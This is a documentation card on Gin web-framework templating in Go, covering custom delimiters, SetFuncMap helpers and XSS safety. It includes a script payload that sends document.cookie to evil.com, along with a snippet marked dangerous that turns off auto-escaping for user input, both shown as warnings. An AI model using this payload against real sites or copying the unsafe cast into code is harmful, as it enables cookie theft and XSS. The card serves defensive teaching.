---
id: computing-software.web-development.gin.gin-template-funcs-delims-xss
name: gin-template-funcs-delims-xss
category: computing-software
field: web-development
product: gin
tags: [gin, delims, setfuncmap, template-funcmap, template-html, xss, html-template, auto-escaping]
level: practitioner
status: docs-checked
description: "Set custom delimiters and template functions in Gin and avoid XSS by never casting user input to template.HTML."
sources:
  - https://github.com/gin-gonic/website/blob/master/src/content/docs/en/docs/rendering/html-rendering.md
licence: Apache-2.0
version: 3
updated: 2026-11-17
---
# Gin template delimiters, FuncMap and XSS safety

Goal: customise template syntax and helper functions, without opening an XSS hole.

## Custom delimiters
```go
router := gin.Default()
router.Delims("{[{", "}]}")
router.LoadHTMLGlob("/path/to/templates")
```

## Custom template functions
Combine `Delims`, `SetFuncMap` and `LoadHTMLFiles`:

```go
func formatAsDate(t time.Time) string {
  year, month, day := t.Date()
  return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

router := gin.Default()
router.Delims("{[{", "}]}")
router.SetFuncMap(template.FuncMap{
  "formatAsDate": formatAsDate,
})
router.LoadHTMLFiles("./testdata/template/raw.tmpl")

router.GET("/raw", func(c *gin.Context) {
  c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
    "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
  })
})
```

`raw.tmpl`: `Date: {[{.now | formatAsDate}]}` renders `Date: 2017/07/01`.

## template.HTML bypasses auto-escaping
`html/template` escapes inserted values to prevent XSS. Casting a string to `template.HTML()` turns that off.

```go
// DANGEROUS if userInput is attacker-controlled
c.HTML(http.StatusOK, "page.tmpl", gin.H{"content": template.HTML(userInput)})

// SAFE: auto-escaped
c.HTML(http.StatusOK, "page.tmpl", gin.H{"content": userInput})
```

Use `template.HTML()` only for content fully under your control, such as static snippets in your code; never for user input or user-populated database fields.

## Attack example from the docs
If `userInput` were `<script>document.location='https://evil.com/?cookie='+document.cookie</script>` and you passed it through `template.HTML()`, the script would be injected into the page unescaped. Leaving the value as a plain string lets `html/template` escape any HTML or JavaScript inside it.

## Checked

Checked: 2026-11-07.

Read in full from a local clone of the gin-gonic/website repository (markdown source, examples inline, no include files). Page read: rendering/html-rendering.md (Custom Delimiters, Custom Template Funcs, template.HTML warning sections and the rest of the page). Confirmed: Delims, SetFuncMap, LoadHTMLFiles, the raw.tmpl result and the template.HTML auto-escaping bypass with the attack example. Trimmed nothing. The linked gin-gonic/examples template directory was not opened. Fixed the source (bogus website/ segment).

Method: documentation only; no commands were run.
